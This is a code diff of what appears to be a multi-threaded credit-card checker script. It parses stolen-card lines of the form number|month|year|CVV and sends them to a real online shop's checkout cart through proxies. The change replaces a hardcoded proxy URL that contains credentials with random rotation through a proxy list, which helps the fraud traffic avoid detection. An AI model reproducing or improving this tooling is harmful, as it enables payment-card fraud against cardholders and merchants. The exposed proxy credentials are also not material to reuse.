@@ -15,32 +15,39 @@ RED = "\033[91m"
 GREEN = "\033[91m"
 line_index_lock = threading.Lock()
 
+def get_proxies(file_path='proxy.txt'):
+    """Read proxies from a file and return as a list."""
+    with open(file_path, 'r') as file:
+        proxies = [line.strip() for line in file if line.strip()]
+    return proxies
+
 def process_lines(queue, bot_number):
+    proxies = get_proxies()  # Get proxies from the proxy.txt file
     while True:
         try:
             line = queue.get_nowait().strip()
         except queue.Empty:
-            # Queue is empty, break the loop
             break
 
-        # Extract cc, month, year, and cvv
         CNUBR, MONTH, YEAR, CVV = map(str.strip, line.split('|'))
 
         CNUBRstr = str(CNUBR)
-        montht = MONTH.replace('0',"")
+        montht = MONTH.replace('0', "")
         b = CNUBRstr[:4]
         c = CNUBRstr[4:8]
         d = CNUBRstr[8:12]
         e = CNUBRstr[12:] 
-        sessions=requests.session()
-        proxy_url = f"http://qqk9da986ugmo7q:92m10sgz8cuunkr@rp.proxyscrape.com:6060"
+        sessions = requests.session()
+
+        # Randomly select a proxy from the list
+        proxy_url = random.choice(proxies)
         proxy = {
-        "http": proxy_url,
-        "https": proxy_url,
-}
+            "http": proxy_url,
+            "https": proxy_url,
+        }
+        
         url = "https://evolvetogether.com/cart/34330523467916:1?traffic_source=buy_now"
         response = sessions.get(url, allow_redirects=True, proxies=proxy)
-
 
         final_url = response.url
 
